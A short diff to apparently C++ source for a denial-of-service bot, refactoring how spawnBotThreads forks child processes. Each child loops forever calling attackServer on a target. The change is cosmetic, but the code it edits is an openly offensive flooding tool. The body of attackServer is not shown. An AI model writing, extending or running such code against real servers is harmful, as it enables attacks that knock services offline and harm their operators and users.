@@ -1,3 +1,4 @@
+
 #include <iostream>
 #include <string>
 #include <vector>
@@ -56,8 +57,7 @@ void attackServer(const std::string& target) {
 
 void spawnBotThreads(const std::string& target) {
     for (int i = 0; i < MAX_THREADS; ++i) {
-        pid_t pid = fork();
-        if (pid == 0) {
+        if (fork() == 0) {
             srand(time(NULL) ^ getpid());
             while (true) {
                 attackServer(target);
